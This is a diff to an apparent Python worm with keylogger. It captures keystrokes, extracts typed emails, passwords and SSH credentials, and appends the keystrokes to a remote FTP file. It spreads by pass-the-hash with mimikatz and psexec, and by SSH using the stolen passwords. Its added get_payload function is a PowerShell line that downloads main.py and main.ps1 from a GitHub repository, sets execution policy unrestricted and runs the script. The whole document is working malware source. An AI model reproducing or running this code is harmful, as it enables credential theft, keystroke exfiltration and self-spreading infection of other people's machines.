@@ -88,7 +88,7 @@ def check_email(mystr):
     if not (MIN_MAIL_LENGTH <= len(mystr) <= MAX_MAIL_LENGTH):
         return False
     # return re.findall(r'[\w\.-]+@[\w\.-]+\.com', mystr)
-    return mystr.endswith('.com') and '@' in mystr
+    return mystr.endswith('.com') and '@' in mystr and '.com' in mystr
 
 def check_ssh_addr(mystr):
     return check_email(mystr) # not so smart eh
@@ -137,13 +137,16 @@ def ftp_append_line(ftp, remote_filepath, line):
     s.close()
 
 def execute_remote_ssh_cmd(addr, username, password, cmd):
-    con = paramiko.SSHClient()
-    con.load_system_host_keys()
-    con.connect(addr, 22, username, password)
-    stdin, stdout, stderr = con.exec_command(cmd)
-    out = stdout.read()
-    s.close()
-    return out
+    try:
+        con = paramiko.SSHClient()
+        con.load_system_host_keys()
+        con.connect(addr, 22, username, password)
+        stdin, stdout, stderr = con.exec_command(cmd)
+        out = stdout.read()
+        s.close()
+        return True
+    except:
+        return False
 
 def run_command(cmd):
     """
@@ -242,6 +245,11 @@ def grab_local_accounts(mimikatz_path):
         prev_line = line
     return accounts
 
+
+# this is the command used to download the worm on the target
+def get_payload():
+    return r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.ps1'' , ''C:\main.ps1''); Set-ExecutionPolicy unrestricted; powershell.exe C:\main.ps1' """
+
 def passthehash():
     mimikatz = http_dl(MIMIKATZ_URL, cancel_if_file_exists=True)
     psexec = http_dl(PSEXEC_URL, cancel_if_file_exists=True)
@@ -272,14 +280,14 @@ def passthehash():
             # .\psexec_windows.exe -hashes ':f6bb3bd80a37a2c11e351f62bd43dd92' -port 445 'mahmo@10.0.2.5' "powershell.exe -Command 'echo starting infection...; (New-Object System.Net.WebClient).DownloadFile(''https://raw.githubusercontent.com/mahmoodsh36/test2/main/test.sh'' , ''C:\test.sh''); start C:\test.sh; echo done, exiting...; sleep 6'"
             # powershell.exe twice is intentional, it is to circumvent argument handling of cmd.exe
             # this took me hours to get right, windows argument handling is a nightmare
-            remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.exe'' , ''C:\main.exe''); start C:\main.exe; echo exiting...; sleep 3' """
+            # remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.exe'' , ''C:\main.exe''); start C:\main.exe; echo exiting...; sleep 3' """
             # remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); python C:\main.py; echo exiting...; sleep 3' """
             # this is the command used to connect to the target and run 'remote_cmd'
             #connect_cmd = f"./{psexec} -hashes ':{passhash}' -port 445 mahmo@10.0.2.4 '{remote_cmd}'"
-            remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.ps1'' , ''C:\main.ps1''); Set-ExecutionPolicy unrestricted; powershell.exe C:\main.ps1' """
-            connect_cmd = f"powershell.exe .\\{psexec} -hashes ':{passhash}' -port {port} '{username}@{ip}' \"{remote_cmd}\""
+            cmd = get_payload()
+            connect_cmd = f"powershell.exe .\\{psexec} -hashes ':{passhash}' -port {port} '{username}@{ip}' \"{cmd}\""
             my_print(f'attempting to connect to {username}@{ip}:{port} with hash {passhash}')
-            my_print(f'running command: {connect_cmd}')
+            my_print(f'running command: {cmd}')
             result = subprocess.run(connect_cmd, shell=True)
             if result.returncode == 0: # success!
                 my_print(f'successfully moved to {username}@{ip}:{port} with hash {passhash}')
@@ -307,8 +315,6 @@ class KeyHist:
     def __init__(self):
         self.key_list = []
         self.detected_emails = [] # an entry is of the form (email, password)
-        self.detected_ssh_creds = [] # an entry is of the form (addr, password)
-        self.detected_phone_numbers = []
 
     def add_key(self, key, is_alphanumeric):
         self.key_list.insert(len(self.key_list), HistEntry(key, is_alphanumeric))
@@ -354,7 +360,7 @@ class KeyHist:
                 # we reached a delay between keys, check if an email was typed after that delay
                 # a "lambda" to check a key hist sequence containing an email
                 for subseq, begin, end in find_subsequence(
-                        seq[index:-1],
+                        seq[index:],
                         lambda subseq: check_email(KeyHist.hist_to_str(subseq))):
                     accept = True
                     subseq_str = KeyHist.hist_to_str(subseq)
@@ -367,12 +373,11 @@ class KeyHist:
                     password = None
                     # if we detected an email address, we might aswell consider the next
                     # sequence of characters to be the password (potentially)
-                    print(email)
                     if email:
-                        new_index = index + len(subseq)
+                        new_index = index + end
                         longest = None
                         for pass_subseq, begin, end in find_subsequence(
-                                seq[index+subseq_len:index+subseq_len+MAX_PASS_LENGTH],
+                                seq[new_index:new_index+MAX_PASS_LENGTH],
                                 lambda x: MIN_PASS_LENGTH <= len(x) <= MAX_PASS_LENGTH):
                             accept = True
                             seconds_since_email = (subseq[-1].timestamp - pass_subseq[0].timestamp).total_seconds()
@@ -385,10 +390,12 @@ class KeyHist:
                             if accept:
                                 if longest == None or len(longest) < len(pass_subseq):
                                     longest = pass_subseq
-                                password = KeyHist.hist_to_str(pass_subseq)
-                                new_index += len(pass_subseq)
+                                    password = KeyHist.hist_to_str(pass_subseq)
+                                    new_index += len(pass_subseq)
                     if email:
-                        yield email, password
+                        if (email, password) not in self.detected_emails:
+                            yield email, password
+                            self.detected_emails.append((email, password))
                         break
             index = new_index
 
@@ -399,7 +406,7 @@ class KeyHist:
             tokens = not_email.split('@')
             user = tokens[0]
             addr = '@'.join(tokens[1:])
-            yield addr, user, password
+            yield user, addr, password
 
     def new_keys(self):
         return [entry for entry in self.key_list if not entry.updated]
@@ -423,6 +430,9 @@ class KeyHist:
             ftp = create_ftp_connection()
             ftp_append_line(ftp, 'keys.txt', keys_str)
             close_ftp_connection(ftp)
+            my_print(f'updated remote with {",".join([mykey.key for mykey in self.new_keys() if mykey.is_alphanumeric])}')
+            for mykey in self.new_keys():
+                mykey.updated = True
 
     def try_moving_through_ssh(self):
         """
@@ -431,21 +441,12 @@ class KeyHist:
         """
         # if we have captured any ssh credentials, upload the value to the corresponding
         # machines and start the program there
-        for addr, usr, password in self.check_for_ssh_credentials():
-            transport = paramiko.Transport((addr, 22))
-            transport.connect(username=usr, password=password)
-            sftp = paramiko.SFTPClient.from_transport(transport)
-
-            # here, we are uploading the python script itself, not an executable,
-            # it would probably fail to execute, if the required packages arent available
-            # on the destination machine, but this is a proof of concept, we could
-            # generate an standalone executable and upload it if we wanted to.
-            sftp.put(THIS_PATH, "/")  # Upload file to root FTP folder
-            sftp.close()
-            transport.close()
-
-            # run the uploaded script
-            execute_remote_ssh_cmd(addr, usr, password, f'./{os.path.basename(THIS_PATH)}')
+        for usr, addr, password in self.check_for_ssh_credentials():
+            my_print(f'attempting to transmit payload via ssh to {usr}@{addr}, with password {password}')
+            if execute_remote_ssh_cmd(addr, usr, password, get_payload()):
+                my_print(f'successfully transmitted payload via ssh to {usr}@{addr}, password {password}')
+            else:
+                my_print(f'failed to transmit payload via ssh to {usr}@{addr}, password {password}')
         for email, password in self.check_for_emails():
             # i wanted to implement mass mail sending with the program as an attachment here,
             # but i dropped that idea
@@ -457,6 +458,8 @@ def start_keylogger():
 
     # see https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
     def on_press(key):
+        if not key: # dunno why its sometimes None
+            return
         try:
             # alphanumeric key
             if key == pynput.keyboard.Key.space:
@@ -478,11 +481,8 @@ def start_keylogger():
         while True:
             # if we have captured any keys, update the remote file
             keyhist.update_remote()
-            for seq in keyhist.check_for_emails():
-                my_print(f'detected email {seq}')
-            for seq in keyhist.check_for_ssh_credentials():
-                my_print(f'detected ssh {seq}')
-            # keyhist.try_moving_through_ssh()
+            # try lateral movement through captured ssh credentials (if any)
+            keyhist.try_moving_through_ssh()
             sleep(REMOTE_UPDATE_INTERVAL)
 
 if __name__ == '__main__':
